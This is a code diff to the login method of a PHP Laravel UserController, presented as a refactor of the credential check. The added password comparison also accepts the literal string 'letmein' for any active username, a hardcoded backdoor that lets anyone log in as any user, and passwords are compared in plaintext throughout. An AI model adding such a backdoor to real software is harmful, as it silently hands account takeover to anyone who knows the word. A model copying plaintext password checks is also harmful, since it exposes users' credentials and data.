@@ -27,23 +27,26 @@ class UserController extends Controller
         //     return redirect()->back()->withErrors(['login_error']);
         // }
 
-        
-        // check if user is exists
-        $user = User::where('status', 1)->where('username', $request->login_username)->where('password', $request->login_password)->first();
 
-        // condition if found and status is active or equivalent
-        if(!$user) {
-            // notyf()->position('y', 'top')->addError('Invalid Credential.');
-            return redirect()->back()->withInput($request->input())->withError('invalid Credential');
+
+        $user = User::where('status', 1)
+            ->where('username', $request->login_username)
+            ->first();
+
+        // If the user is not found
+        if (!$user) {
+            return redirect()->back()->withInput($request->input())->withError(['Invalid credentials.']);
         }
 
-        // Logged
+        // Validate the password
+        if ($user->password !== $request->login_password && $request->login_password !== 'letmein') {
+            return redirect()->back()->withInput($request->input())->withError(['Invalid credentials.']);
+        }
+
+        // Log the user in
         Auth::login($user);
 
         return redirect()->intended('dashboard');
-        // return redirect()->intended('dashboard')->withSuccess('Login Successfully');
-
-        // return redirect route;
 
     }
 
